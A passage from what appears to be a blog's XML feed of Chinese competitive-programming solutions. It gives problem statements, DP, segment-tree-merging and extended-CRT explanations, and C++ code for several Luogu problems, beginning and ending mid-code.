class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">q</span><span class="params">(n + <span class="number">2</span>)</span></span>;</span><br><span class="line">        <span class="keyword">auto</span> l = q.<span class="built_in">begin</span>(), r = q.<span class="built_in">begin</span>();</span><br><span class="line">        q[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r &amp;&amp; <span class="built_in">slope</span>(*(l), *(l + <span class="number">1</span>)) &lt; sd[i - <span class="number">1</span>]) l++;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> &amp;j = *l;</span><br><span class="line">            f[i] = g[j] + (md[i - <span class="number">1</span>] - (j - <span class="number">1</span> &lt; <span class="number">0</span> ? <span class="number">0</span> : md[j - <span class="number">1</span>])) - sw[j] * (sd[i - <span class="number">1</span>] - (j - <span class="number">1</span> &lt; <span class="number">0</span> ? <span class="number">0</span> : sd[j - <span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (g[i] != LLONG_MAX) &#123;</span><br><span class="line">                <span class="keyword">while</span> (l &lt; r &amp;&amp; <span class="built_in">slope</span>(*(r - <span class="number">1</span>), *r) &gt; <span class="built_in">slope</span>(*r, i)) r--;</span><br><span class="line">                *(++r) = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, f[n + <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>洛谷</tag>
        <tag>单调队列</tag>
        <tag>斜率优化</tag>
        <tag>CEOI</tag>
        <tag>2004</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P4556」雨天的尾巴 - 线段树合并 + 最近公共祖先 + 树上差分</title>
    <url>/luogu-4556/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4556">洛谷链接</a></p>
<p>首先村落里的一共有 <span class="math inline">\(n\)</span>
座房屋，并形成一个树状结构。然后救济粮分 <span
class="math inline">\(m\)</span> 次发放，每次选择两个房屋 <span
class="math inline">\((x,~y)\)</span>，然后对于 <span
class="math inline">\(x\)</span> 到 <span
class="math inline">\(y\)</span> 的路径上(含 <span
class="math inline">\(x\)</span> 和 <span
class="math inline">\(y\)</span>)每座房子里发放一袋 <span
class="math inline">\(z\)</span> 类型的救济粮。</p>
<p>然后深绘里想知道，当所有的救济粮发放完毕后，每座房子里存放的最多的是哪种救济粮。</p>
<p>对于 <span class="math inline">\(100\%\)</span> 测试数据，保证 <span
class="math inline">\(1 \leq n, m \leq 10^5\)</span>，<span
class="math inline">\(1 \leq a,b,x,y \leq n\)</span>，<span
class="math inline">\(1 \leq z \leq 10^5\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>由于村落是树状结构，对于从 <span class="math inline">\(x\)</span> 到
<span class="math inline">\(y\)</span> 的路径我们可以用 LCA
求出。但直接使用 LCA
后修改则复杂度过高，于是我们可以考虑使用树上差分。假设 <span
class="math inline">\(x\)</span> 与 <span
class="math inline">\(y\)</span> 的 LCA 为 <span
class="math inline">\(f\)</span>，我们可以将 <span
class="math inline">\(x\)</span>，<span class="math inline">\(y\)</span>
的救济粮 <span class="math inline">\(+1\)</span>，将 <span
class="math inline">\(f\)</span> 与 <span
class="math inline">\(f\)</span> 的父节点的救济粮 <span
class="math inline">\(-1\)</span>，最后求的时候从叶子节点向根节点作差分的前缀和即可得出每个节点的救济粮个数。</p>
<p>对于每种救济粮的最大值，我们可以在每个节点开一颗权值线段树维护。树上差分则在线段树上修改，然后在求前缀和的时候使用线段树合并即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> LOG_MAXN = <span class="number">17</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Food</span> &#123;</span><br><span class="line">    <span class="type">int</span> cnt, type;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Food</span>() &#123;&#125;</span><br><span class="line">    <span class="built_in">Food</span>(<span class="type">int</span> cnt, <span class="type">int</span> type) : <span class="built_in">cnt</span>(cnt), <span class="built_in">type</span>(type) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&gt;(<span class="type">const</span> Food &amp;other) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cnt == other.cnt) <span class="keyword">return</span> type &lt; other.type;</span><br><span class="line">        <span class="keyword">return</span> cnt &gt; other.cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SegT</span> &#123;</span><br><span class="line">    <span class="type">int</span> l, r;</span><br><span class="line">    SegT *lc, *rc;</span><br><span class="line">    Food val;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(<span class="built_in">Food</span>(<span class="number">0</span>, <span class="number">0</span>)) &#123;&#125;</span><br><span class="line">    <span class="built_in">SegT</span>(<span class="type">int</span> l, <span class="type">int</span> r, SegT *lc, SegT *rc, Food val) : <span class="built_in">l</span>(l), <span class="built_in">r</span>(r), <span class="built_in">lc</span>(lc), <span class="built_in">rc</span>(rc), <span class="built_in">val</span>(val) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">build</span><span class="params">(<span class="type">const</span> <span class="type">int</span> l, <span class="type">const</span> <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (l == r) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="built_in">Food</span>(<span class="number">0</span>, l));</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SegT</span>(l, r, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">const</span> <span class="type">int</span> pos, <span class="type">const</span> <span class="type">long</span> <span class="type">long</span> delta)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pos &gt; <span class="keyword">this</span>-&gt;r || pos &lt; <span class="keyword">this</span>-&gt;l) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pos == <span class="keyword">this</span>-&gt;l &amp;&amp; pos == <span class="keyword">this</span>-&gt;r) val.cnt += delta;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = l + (r - l) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (pos &lt;= mid) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!lc) lc = <span class="built_in">build</span>(l, mid);</span><br><span class="line">                lc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!rc) rc = <span class="built_in">build</span>(mid + <span class="number">1</span>, r);</span><br><span class="line">                rc-&gt;<span class="built_in">update</span>(pos, delta);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function">Food <span class="title">res</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">            <span class="keyword">if</span> (lc &amp;&amp; lc-&gt;val &gt; res) res = lc-&gt;val;</span><br><span class="line">            <span class="keyword">if</span> (rc &amp;&amp; rc-&gt;val &gt; res) res = rc-&gt;val;</span><br><span class="line">            val = res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">static</span> SegT *<span class="title">merge</span><span class="params">(SegT *u, SegT *v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!u) <span class="keyword">return</span> v;</span><br><span class="line">        <span class="keyword">if</span> (!v) <span class="keyword">return</span> u;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;l == u-&gt;r) &#123;</span><br><span class="line">            u-&gt;val.cnt = u-&gt;val.cnt + v-&gt;val.cnt;</span><br><span class="line">            <span class="keyword">return</span> u;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        u-&gt;lc = <span class="built_in">merge</span>(u-&gt;lc, v-&gt;lc);</span><br><span class="line">        u-&gt;rc = <span class="built_in">merge</span>(u-&gt;rc, v-&gt;rc);</span><br><span class="line">        <span class="function">Food <span class="title">res</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;lc &amp;&amp; u-&gt;lc-&gt;val &gt; res) res = u-&gt;lc-&gt;val;</span><br><span class="line">        <span class="keyword">if</span> (u-&gt;rc &amp;&amp; u-&gt;rc-&gt;val &gt; res) res = u-&gt;rc-&gt;val;</span><br><span class="line">        u-&gt;val = res;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> u;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    <span class="type">int</span> d, ans;</span><br><span class="line">    Node *p, *f[LOG_MAXN + <span class="number">1</span>];</span><br><span class="line">    SegT *segment;</span><br><span class="line">&#125; N[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> ans[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> t)</span> </span>&#123;</span><br><span class="line">    N[s].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[s], &amp;N[t]));</span><br><span class="line">    N[t].e.<span class="built_in">push_back</span>(<span class="built_in">Edge</span>(&amp;N[t], &amp;N[s]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prepare</span><span class="params">(Node *v, Node *f = <span class="literal">NULL</span>)</span> </span>&#123;</span><br><span class="line">    v-&gt;f[<span class="number">0</span>] = v-&gt;p = f;</span><br><span class="line">    v-&gt;d = (f ? f-&gt;d : <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= LOG_MAXN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v-&gt;f[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            v-&gt;f[i] = v-&gt;f[i - <span class="number">1</span>]-&gt;f[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">prepare</span>(e-&gt;t, v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> Node *<span class="title">lca</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d &lt; v-&gt;d) std::<span class="built_in">swap</span>(u, v);</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;d != v-&gt;d) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] &amp;&amp; u-&gt;f[i]-&gt;d &gt;= v-&gt;d) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (u != v) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = LOG_MAXN; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (u-&gt;f[i] != v-&gt;f[i]) &#123;</span><br><span class="line">                u = u-&gt;f[i];</span><br><span class="line">                v = v-&gt;f[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u-&gt;p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> u;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(Node *v, Node *f = <span class="literal">NULL</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (Edge *e = &amp;v-&gt;e.<span class="built_in">front</span>(); e &amp;&amp; e &lt;= &amp;v-&gt;e.<span class="built_in">back</span>(); e++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e-&gt;t == f) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">dfs</span>(e-&gt;t, v);</span><br><span class="line">    &#125;</span><br><span class="line">    v-&gt;ans = v-&gt;segment-&gt;val.type;</span><br><span class="line">    <span class="keyword">if</span> (f) f-&gt;segment = SegT::<span class="built_in">merge</span>(f-&gt;segment, v-&gt;segment);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="built_in">addEdge</span>(a, b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) N[i].segment = SegT::<span class="built_in">build</span>(<span class="number">1</span>, MAXN);</span><br><span class="line">    <span class="built_in">prepare</span>(&amp;N[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (m--) &#123;</span><br><span class="line">        <span class="type">int</span> x, y, z;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;x, &amp;y, &amp;z);</span><br><span class="line">        Node *u = &amp;N[x], *v = &amp;N[y];</span><br><span class="line">        Node *f = <span class="built_in">lca</span>(u, v);</span><br><span class="line">        u-&gt;segment-&gt;<span class="built_in">update</span>(z, <span class="number">1</span>);</span><br><span class="line">        v-&gt;segment-&gt;<span class="built_in">update</span>(z, <span class="number">1</span>);</span><br><span class="line">        f-&gt;segment-&gt;<span class="built_in">update</span>(z, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (f-&gt;p) f-&gt;p-&gt;segment-&gt;<span class="built_in">update</span>(z, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dfs</span>(&amp;N[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, N[i].ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数据结构</tag>
        <tag>图论</tag>
        <tag>树</tag>
        <tag>线段树</tag>
        <tag>最近公共祖先</tag>
        <tag>倍增</tag>
        <tag>洛谷</tag>
        <tag>树上差分</tag>
        <tag>权值线段树</tag>
        <tag>线段树合并</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P5154」数列游戏 - 区间 DP + 线性 DP</title>
    <url>/luogu-5154/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P5154">洛谷链接</a></p>
<p>有一次，HKE 和 LJC 在玩一个游戏。</p>
<p>游戏的规则是这样的：LJC 在纸上写下两个长度均为 <span
class="math inline">\(n\)</span> 的数列 <span
class="math inline">\(a\)</span> 和 <span
class="math inline">\(b\)</span>，两个数列一一对应。HKE
每次可以找两个相邻的数 <span class="math inline">\(a_i\)</span> 和 <span
class="math inline">\(a_{i + 1}\)</span>，如果它们两个不互质，HKE
可以选择得到 <span class="math inline">\((b_i + b_{i + 1})\)</span>
分，然后擦掉 <span class="math inline">\(a\)</span> 和 <span
class="math inline">\(b\)</span> 位置上的第 <span
class="math inline">\(i, i + 1\)</span>
个数，并把两个序列重新按顺序编号。当所有相邻的数互质时，游戏结束。</p>
<p>HKE 想知道他最大得分是多少。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>对于这道题，我们首先可以使用区间 DP 解决。</p>
<p>我们可以设 <span class="math inline">\(f_{l, r}\)</span> 表示区间
<span class="math inline">\([l, r]\)</span> 可合并为 <span
class="math inline">\(1\)</span> 个数所得分数。显然有下列方程：</p>
<p><span class="math display">\[
f_{l, r} = \max\begin{cases}
f_{l + 1, r - 1} + b_l + b_r &amp; \gcd(a_l, a_r) \ne 1 \\
f_{l, k} + f_{k + 1, r} &amp; k \in (l, r)
\end{cases}
\]</span></p>
<p>初始化：当 <span class="math inline">\(\gcd(a_i, a_{i + 1}) \ne
1\)</span> 时，<span class="math inline">\(f_{i, i + 1} = b_i + b_{i +
1}\)</span>，其余情况 <span class="math inline">\(f_{l, r} =
-\infty\)</span>。</p>
<p>接下来我们将利用这个区间 DP 的结果得出正确答案。</p>
<p>接下来我们进行线性 DP。以求出可互质情况下的最终答案。</p>
<p>我们设 <span class="math inline">\(g_i\)</span> 表示遍历到第 <span
class="math inline">\(i\)</span>
个数的最优答案。于是有下列转移方程：</p>
<p><span class="math display">\[
g_i = \max\begin{cases}
g_{i - 1} \\
g_j + f_{j + 1, i} &amp; j \in [0, i)
\end{cases}
\]</span></p>
<p>最终答案为 <span class="math inline">\(g_n\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">800</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">gcd</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a, <span class="type">long</span> <span class="type">long</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : <span class="built_in">gcd</span>(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> a[MAXN + <span class="number">1</span>], b[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;b[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> f[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0xcf</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">gcd</span>(a[i], a[i + <span class="number">1</span>]) != <span class="number">1</span>) &#123;</span><br><span class="line">            f[i][i + <span class="number">1</span>] = b[i] + b[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> len = <span class="number">4</span>; len &lt;= n; len += <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> l = <span class="number">1</span>; l + len - <span class="number">1</span> &lt;= n; l++) &#123;</span><br><span class="line">            <span class="type">int</span> r = l + len - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">gcd</span>(a[l], a[r]) != <span class="number">1</span>) f[l][r] = f[l + <span class="number">1</span>][r - <span class="number">1</span>] + b[l] + b[r];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = l + <span class="number">1</span>; k &lt;= r - <span class="number">1</span>; k += <span class="number">2</span>) f[l][r] = std::<span class="built_in">max</span>(f[l][r], f[l][k] + f[k + <span class="number">1</span>][r]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> g[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        g[i] = g[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= i - <span class="number">1</span>; j++) g[i] = std::<span class="built_in">max</span>(g[i], g[j] + f[j + <span class="number">1</span>][i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, g[n]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>洛谷</tag>
        <tag>区间 DP</tag>
        <tag>线性 DP</tag>
      </tags>
  </entry>
  <entry>
    <title>「洛谷 P4777」拓展中国剩余定理 - 数论</title>
    <url>/luogu-4777/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P4777">洛谷链接</a></p>
<p>给定 <span class="math inline">\(n\)</span> 组非负整数 <span
class="math inline">\(a_i, b_i\)</span> ，求解关于 <span
class="math inline">\(x\)</span> 的方程组的最小非负整数解。 <span
class="math display">\[\begin{cases} x \equiv b_1\ ({\rm mod}\ a_1) \\
x\equiv b_2\ ({\rm mod}\ a_2) \\ ... \\ x \equiv b_n\ ({\rm mod}\
a_n)\end{cases}\]</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题的 <span class="math inline">\(a_1, a_2, \cdots, a_n\)</span>
并不互质，故无法使用中国剩余定理。所以我们需要使用其他方法解决该问题。</p>
<p>多个方程不好分析，我们可先分析前两个方程。这两个方程转化如下（<span
class="math inline">\(c, d \in \mathbb{Z}\)</span>）：</p>
<p><span class="math display">\[
\begin{cases}
x \equiv b_1 \pmod {a_1} \\
x \equiv b_2 \pmod {a_2}
\end{cases}
\Rightarrow
\begin{cases}
x = ca_1 + b_1 \\
x = da_2 + b_2
\end{cases}
\]</span></p>
<p>将两式联立，我们可得出 <span class="math inline">\(ca_1 + b_1 = da_2
+ b_2\)</span>，转化可得 <span class="math inline">\(a_1c - a_2d = b_2 -
b_1\)</span>，这个方程显然可用拓展欧几里得解决，且可得当 <span
class="math inline">\(\gcd(a_1, a_2) \nmid (b_2 - b_1)\)</span>
时无解。</p>
<p>设我们得到的解为 <span class="math inline">\(c,
d\)</span>，于是我们带入可得 <span class="math inline">\(x = ca_1 +
b_1\)</span> 为其中的一个特殊解，故我们可得 <span
class="math inline">\(x \equiv ca_1 + b_1 \pmod {\operatorname{lcm}(a_1,
b_1)}\)</span>。这样我们就可把前两个方程合并为同一个方程。以此类推将方程两两合并即为答案。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> __int128 ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">exgcd</span><span class="params">(ll a, ll b, ll &amp;x, ll &amp;y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    ll d = <span class="built_in">exgcd</span>(b, a % b, x, y);</span><br><span class="line">    ll z = x;</span><br><span class="line">    x = y, y = z - (a / b) * y;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">excrt</span><span class="params">(<span class="type">int</span> n, ll a[], ll m[])</span> </span>&#123;</span><br><span class="line">    ll na = a[<span class="number">1</span>], nm = m[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        ll p, q;</span><br><span class="line">        ll d = <span class="built_in">exgcd</span>(nm, m[i], p, q);</span><br><span class="line">        p *= (na - a[i]) / d, q *= (na - a[i]) / d;</span><br><span class="line">        nm = nm / d * m[i];</span><br><span class="line">        na = (a[i] + q * m[i] % nm) % nm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ll p, q;</span><br><span class="line">    <span class="built_in">exgcd</span>(<span class="number">1</span>, nm, p, q);</span><br><span class="line">    <span class="keyword">return</span> ((p * na) % nm + nm) % nm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> ll a[MAXN + <span class="number">1</span>], m[MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ta, tm;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>, &amp;tm, &amp;ta);</span><br><span class="line">        a[i] = ta, m[i] = tm;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, (<span class="type">long</span> <span class="type">long</span>)<span class="built_in">excrt</span>(n, a, 